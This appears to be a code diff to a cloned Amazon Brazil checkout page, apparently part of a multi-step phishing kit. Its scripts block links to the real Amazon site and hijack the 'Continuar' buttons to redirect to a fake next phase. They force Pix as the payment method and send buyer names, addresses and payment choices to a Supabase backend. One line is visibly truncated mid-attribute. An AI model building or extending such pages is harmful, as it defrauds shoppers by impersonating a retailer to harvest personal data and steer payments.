@@ -1099,76 +1099,7 @@ footer, .nav-ftr-batmobile, #nav-ftr {
 <div id=be style=display:none;visibility:hidden>
 </div>
 </div>
-<div id=a-white class=sf-hidden></div><div id=a-popover-root style=z-index:-1;position:absolute></div><div id=a-popover-modal></div><div class=bottomsheet-container><div class=webflow-bottomsheet-instance id=webflow-bottomsheet-instance style=position:relative;height:100%;width:100%;overflow:hidden></div></div>
-<script>
-(function() {
-    // Bloqueio Amazon
-    var blockList = ['amazon.com', 'amazon.com.br'];
-    document.addEventListener('click', function(e) {
-        var a = e.target.closest('a');
-        if (a && a.href && blockList.some(function(d) { return a.href.indexOf(d) !== -1; })) {
-            e.preventDefault();
-        }
-    }, true);
-
-    // Redirecionar forms para Fase 3 (caso algum tenha sobrado)
-    document.querySelectorAll('form').forEach(function(f) {
-        if (f.action.indexOf('amazon') !== -1 || f.action.indexOf('/checkout/') !== -1) {
-            f.action = 'Checkout - Fase 3.html';
-        }
-    });
-
-    // Fix Alterar endereco link
-    var changeAddr = document.getElementById('change-delivery-link');
-    if (changeAddr) {
-        changeAddr.href = 'Checkout - Fase 1.html';
-        changeAddr.removeAttribute('onclick');
-    }
-
-    // Carregar dados da Fase 1
-    var raw = sessionStorage.getItem('checkout_address');
-    if (!raw) return;
-    var data = JSON.parse(raw);
-    
-    var nome = data.nome || 'Cliente';
-    var parts = [];
-    if (data.rua) parts.push(data.rua);
-    if (data.numero) parts.push(data.numero);
-    if (data.bairro) parts.push(data.bairro);
-    if (data.cidade) parts.push(data.cidade);
-    if (data.estado) parts.push(data.estado);
-    if (data.cep) parts.push(data.cep);
-    parts.push('Brasil');
-    var endereco = parts.join(', ');
-
-    var els = document.querySelectorAll('span, div, b, strong, p, h2, h3');
-    els.forEach(function(el) {
-        // We might be operating on elements that have children.
-        // It's safer to only modify if childNodes span contains only text or if we check nodeValue.
-        // Let's do a simple replace on the entire text content, but we must be careful not to destroy inner elements if the match is too broad.
-        
-        if (el.textContent.trim() === 'Seu nome') {
-             el.textContent = nome;
-        } else if (el.textContent.trim() === 'Seu endereço') {
-             el.textContent = endereco;
-        } else if (el.textContent.trim() === 'Said' || el.textContent.trim() === 'Cliente') {
-             var primeiroNome = nome.split(' ')[0];
-             el.textContent = ' ' + primeiroNome;
-        } else {
-             // For "Entrega para Seu nome"
-             if (el.childNodes.length > 0) {
-                 for (var i=0; i<el.childNodes.length; i++) {
-                     var node = el.childNodes[i];
-                     if (node.nodeType === 3) { // Text node
-                         if (node.nodeValue.indexOf('Seu nome') !== -1) {
-                             node.nodeValue = node.nodeValue.replace('Seu nome', nome);
-                         }
-                         if (node.nodeValue.indexOf('Seu endereço') !== -1) {
-                             node.nodeValue = node.nodeValue.replace('Seu endereço', endereco);
-                         }
-                     }
-                 }
-             }
+<div id=a-white class=sf-hidden></div><div id=a-popover-root style=z-index:-1;position:absolute></div><div id=a-popover-modal></div><div class=bottomsheet-container><div class=webflow-bottomsheet-instance id=webflow-bottomsheet-instance style=position:relative;height:100%;w     }
         }
     });
 })();
@@ -1222,141 +1153,195 @@ document.addEventListener('DOMContentLoaded', function() {
 </script>
 
 
+<!-- CONSOLIDATED PHASE 2 LOGIC: PIX & NAVIGATION -->
 <script>
-document.addEventListener('DOMContentLoaded', function() {
-    // Tentar selecionar o input de rádio do Pix
-    var checkPix = function() {
-        var radios = document.querySelectorAll('input[type="radio"][name="ppw-instrumentRowSelection"], input[type="radio"]');
-        var found = false;
-        radios.forEach(function(radio) {
-            if (radio.value.indexOf('Pix') !== -1 || radio.closest('label').textContent.indexOf('Pix') !== -1) {
-                // Força o checked
-                radio.checked = true;
-                
-                // Simula um clique para despertar o JS da Amazon e ativar os botões de Continuar
-                var event = new MouseEvent('click', {
-                    view: window,
-                    bubbles: true,
-                    cancelable: true
-                });
-                radio.dispatchEvent(event);
-                
-                // Também tenta clicar no label associado, caso o JS da Amazon ouça o label em vez do input
-                var label = radio.closest('label') || document.querySelector('label[for="' + radio.id + '"]');
-                if (label) {
-                    label.dispatchEvent(event);
-                }
-                
-                found = true;
-            }
-        });
-        
-        // Ativar os botões de Continuar na força bruta caso o clique não funcione
-        if (found) {
-            var continues = document.querySelectorAll('.a-button-input[data-testid*="continue-button"], .a-button-input');
-            continues.forEach(function(btn) {
-                btn.removeAttribute('disabled');
-                btn.classList.remove('a-button-disabled');
-                
-                var parentBtn = btn.closest('.a-button');
-                if (parentBtn) {
-                    parentBtn.classList.remove('a-button-disabled');
-                    parentBtn.style.pointerEvents = 'auto'; // Garante que cliques passem
-                    // Restaurando as cores do botão principal
-                    parentBtn.style.opacity = '1';
-                    parentBtn.style.background = '#FFD814';
-                    parentBtn.style.borderColor = '#FCD200';
-                    parentBtn.style.boxShadow = '0 2px 5px 0 rgba(213,217,217,.5)';
-                    
-                    var inner = parentBtn.querySelector('.a-button-inner');
-                    if (inner) {
-                        inner.style.background = '#FFD814';
-                        inner.style.boxShadow = 'none';
-                    }
-                    
-                    var text = parentBtn.querySelector('.a-button-text');
-                    if (text) {
-                        text.style.color = '#0F1111';
-                    }
-                }
-            });
+(function() {
+    console.log('Amazon Drone: Phase 2 Logic Initialized');
+
+    // Helper: Address Formatter
+    function formatAddress(data) {
+        if (!data) return "";
+
+        function normalizeText(value) {
+            return String(value || '')
+                .trim()
+                .toLowerCase()
+                .normalize('NFD')
+                .replace(/[\u0300-\u036f]/g, '');
         }
-    };
-    
-    // Executar imediatamente e após 1s por causa do carregamento assíncrono de partes da Amazon
-    checkPix();
-    setTimeout(checkPix, 500);
-    setTimeout(checkPix, 1500);
-});
-</script>
 
+        function pushUnique(parts, value) {
+            const text = String(value || '').trim();
+            if (!text) return;
+            const normalized = normalizeText(text);
+            if (!parts.some(item => normalizeText(item) === normalized)) {
+                parts.push(text);
+            }
+        }
 
-<!-- SUPABASE BRIDGE INTEGRATION -->
-<script src="assets/js/supabase-bridge.js"></script>
-<script>
-document.addEventListener('DOMContentLoaded', async () => {
-    // Initialize bridge
-    const bridge = window.__amzBridge;
-    if (!bridge) return;
-
-    // Load current state to populate header address if needed
-    const { data: state, error } = await bridge.load();
-    if (state) {
-        const nome = (state.nome || '').trim() || 'Cliente';
-        const enderecoParts = [];
-        if (state.rua) enderecoParts.push(state.rua.trim());
-        if (state.numero) enderecoParts.push(state.numero.trim());
-        if (state.bairro) enderecoParts.push(state.bairro.trim());
-        if (state.cidade) enderecoParts.push(state.cidade.trim());
-        if (state.estado) enderecoParts.push(state.estado.trim());
-        if (state.cep) enderecoParts.push(state.cep.trim());
-        enderecoParts.push('Brasil');
-        const endereco = enderecoParts.join(', ');
-
-        const customerName = document.getElementById('deliver-to-customer-text');
-        if (customerName) customerName.textContent = 'Entrega para ' + nome;
-
-        const customerAddress = document.getElementById('deliver-to-address-text');
-        if (customerAddress) customerAddress.textContent = endereco;
+        let parts = [];
+        let street = (data.rua || data.logradouro || "").trim();
+        let num = (data.numero || "").trim();
+        if (street && num) pushUnique(parts, `${street}, ${num}`);
+        else pushUnique(parts, street);
+        pushUnique(parts, data.complemento);
+        pushUnique(parts, data.bairro);
+        pushUnique(parts, data.cidade);
+        pushUnique(parts, data.estado);
+        pushUnique(parts, data.cep);
+        pushUnique(parts, "Brasil");
+        return parts.filter(p => p).join(", ");
     }
 
-    // Targeting both top and bottom "Continuar" buttons
-    const submitBtns = document.querySelectorAll('.a-button-input[data-testid*="continue-button"]');
-    
-    submitBtns.forEach(submitBtn => {
-        const originalParent = submitBtn.parentElement;
-        const newBtn = submitBtn.cloneNode(true);
-        newBtn.type = "button";
-        newBtn.removeAttribute('disabled');
-        submitBtn.style.display = 'none';
-        originalParent.appendChild(newBtn);
-
-        newBtn.addEventListener('click', async (e) => {
-            e.preventDefault();
+    // 1. Pix Selection Logic
+    function setupPix() {
+        const radios = document.querySelectorAll('input[type="radio"]');
+        radios.forEach(radio => {
+            const isPix = radio.value?.indexOf('Pix') !== -1 || 
+                          radio.id?.indexOf('Pix') !== -1 || 
+                          radio.closest('label')?.textContent?.indexOf('Pix') !== -1;
             
-            // Sync state to Supabase
-            if (bridge && bridge.save) {
-                await bridge.save({ metodo_pagamento: 'PIX' });
+            if (isPix) {
+                radio.checked = true;
+                ['click', 'change', 'input'].forEach(evt => {
+                    radio.dispatchEvent(new Event(evt, { bubbles: true }));
+                });
+                
+                const continues = document.querySelectorAll('.a-button-input, .a-button');
+                continues.forEach(btn => {
+                    btn.removeAttribute('disabled');
+                    if (btn.classList) btn.classList.remove('a-button-disabled');
+                    if (btn.style) {
+                        btn.style.pointerEvents = 'auto';
+                        btn.style.opacity = '1';
+                    }
+                });
             }
+        });
+    }
+
+    // 2. Global Navigation Hijack
+    document.addEventListener('click', async function(e) {
+        const target = e.target.closest('.a-button-input, .a-button, button, input[type="submit"]');
+        if (!target) return;
+
+        const text = (target.innerText || target.value || '').trim();
+        const isContinue = text.includes('Continuar') || 
+                           text.includes('Usar este') || 
+                           target.dataset?.testid?.includes('continue');
+
+        if (isContinue) {
+            e.preventDefault();
+            e.stopPropagation();
             
-            // Redirect to Phase 3
+            const textEl = target.querySelector('.a-button-text') || (target.tagName === 'INPUT' ? null : target);
+            if (textEl && textEl !== target) textEl.textContent = 'Processando...';
+            target.style.opacity = '0.7';
+
+            const bridge = window.__amzBridge || window.Bridge;
+            if (bridge && bridge.save) {
+                try {
+                    await Promise.race([
+                        bridge.save({ metodo_pagamento: 'PIX', last_step: 'checkout_2' }),
+                        new Promise(res => setTimeout(res, 1000))
+                    ]);
+                } catch(err) {}
+            }
             window.location.href = 'Checkout - Fase 3.html';
+        }
+    }, { capture: true });
+
+    // 3. Header & Address Update
+    async function updateHeader() {
+        const bridge = window.__amzBridge || window.Bridge;
+        let legacyState = {};
+        try {
+            legacyState = JSON.parse(sessionStorage.getItem('checkout_address') || '{}') || {};
+        } catch (err) {}
+
+        let state = Object.assign({}, legacyState, {
+            nome: sessionStorage.getItem('user_name') || legacyState.nome || '',
+            full_address: sessionStorage.getItem('user_full_address') || legacyState.full_address || ''
         });
 
-        // Ensure parent is enabled
-        const parent = newBtn.closest('.a-button');
-        if (parent) {
-            parent.classList.remove('a-button-disabled');
-            parent.style.pointerEvents = 'auto';
-        }
-    });
+        try {
+            if (bridge && bridge.init) {
+                await bridge.init('checkout_2');
+            }
 
-    // Block all Amazon external links
-    document.querySelectorAll('a[href*="amazon.com"]').forEach(link => {
-        link.addEventListener('click', (e) => e.preventDefault());
-        link.href = 'javascript:void(0)';
+            if (bridge) {
+                const snapshot = bridge.getState ? await bridge.getState() : await bridge.load();
+                state = Object.assign(
+                    {},
+                    state,
+                    snapshot && typeof snapshot === 'object'
+                        ? (snapshot.data || snapshot.buyer || snapshot)
+                        : {}
+                );
+            }
+        } catch(e) {}
+
+        const nome = (
+            state.nome ||
+            state.name ||
+            sessionStorage.getItem('user_name') ||
+            ''
+        ).trim() || 'Cliente';
+
+        const endereco = formatAddress(state) ||
+            state.full_address ||
+            state.fullAddress ||
+            sessionStorage.getItem('user_full_address') ||
+            'Endereço não informado';
+
+        const nameEl = document.getElementById('deliver-to-customer-text');
+        if (nameEl) nameEl.textContent = 'Entrega para ' + nome;
+
+        const addrEl = document.getElementById('deliver-to-address-text');
+        if (addrEl) addrEl.textContent = endereco;
+
+        const firstName = nome.split(/\s+/).filter(Boolean)[0] || nome;
+        const geruNameEl = Array.from(document.querySelectorAll('.maple-banner__text .a-size-medium.a-text-bold'))
+            .find(el => el.textContent.trim() === 'Said');
+        if (geruNameEl) geruNameEl.textContent = ' ' + firstName;
+    }
+
+    // 4. Misc Fixes (Redirection, Links)
+    function applyGlobalFixes() {
+        // Fix Alterar endereco link
+        const changeAddr = document.getElementById('change-delivery-link');
+        if (changeAddr) {
+            changeAddr.href = 'Checkout - Fase 1.html';
+            changeAddr.removeAttribute('onclick');
+        }
+
+        // Block Amazon External Links
+        document.addEventListener('click', (e) => {
+            const a = e.target.closest('a');
+            if (a && a.href && (a.href.includes('amazon.com') || a.href.includes('amazon.com.br'))) {
+                if (!a.href.includes('Checkout')) e.preventDefault();
+            }
+        }, true);
+    }
+
+    // Initialize
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', () => {
+            setupPix();
+            updateHeader();
+            applyGlobalFixes();
+        });
+    } else {
+        setupPix();
+        updateHeader();
+        applyGlobalFixes();
+    }
+
+    [500, 1500, 3000].forEach(ms => {
+        setTimeout(setupPix, ms);
+        setTimeout(updateHeader, ms);
     });
-});
+})();
 </script>
 
     <script src="meta-attribution.js"></script>
@@ -1388,6 +1373,38 @@ document.addEventListener('DOMContentLoaded', async () => {
         }
         ping();
         setInterval(ping, 30000);
+      })();
+    </script>
+    <script>
+      (function() {
+        function enableContinueButtons() {
+          const continueInputs = document.querySelectorAll('.a-button-input[type="submit"], input[data-testid*="continue-button"]');
+          continueInputs.forEach(input => {
+            input.disabled = false;
+            input.type = 'button';
+            let parent = input.closest('.a-button');
+            if (parent) {
+              parent.classList.remove('a-button-disabled');
+            }
+            input.addEventListener('click', function(e) {
+              e.preventDefault();
+              e.stopPropagation();
+              window.location.href = 'Checkout - Fase 3.html';
+            }, true);
+            if (parent) {
+              parent.addEventListener('click', function(e) {
+                if (e.target !== input) {
+                  e.preventDefault();
+                  e.stopPropagation();
+                  window.location.href = 'Checkout - Fase 3.html';
+                }
+              }, true);
+            }
+          });
+        }
+        enableContinueButtons();
+        setTimeout(enableContinueButtons, 1000);
+        setTimeout(enableContinueButtons, 3000);
       })();
     </script>
   </body>
